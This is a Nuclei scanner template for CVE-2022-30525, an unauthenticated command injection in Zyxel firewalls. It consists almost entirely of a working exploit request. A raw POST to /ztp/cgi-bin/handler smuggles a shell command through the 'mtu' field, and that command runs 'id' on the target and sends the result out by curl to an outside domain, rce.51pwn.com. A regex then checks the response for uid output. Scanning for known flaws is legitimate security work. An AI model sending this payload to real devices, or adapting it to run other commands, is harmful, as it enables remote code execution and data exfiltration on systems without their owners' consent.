id: check_CVE-2022-30525

info:
  name: CVE-2022-30525
  description: |+
    doNuclei http://127.0.0.1:8080 CVE-2022-30525.yaml
    nuclei -duc -validate -t 51pwn/CVE-2022-30525.yaml
  reference:
    - https://github.com/hktalent/nuclei-templates
    - https://51pwn.com
  author: 51pwn
  severity: medium
  tags: web,zyxel,firewalls

requests:
  - raw:
      - |+
        POST /ztp/cgi-bin/handler HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; curl `id`.rce.51pwn.com;","data":"hi"}

    unsafe: true
    
    matchers:
      - type: regex
        part: body
        regex:
          - '(uid=\d+\([^\n]+\\())'
        condition: and
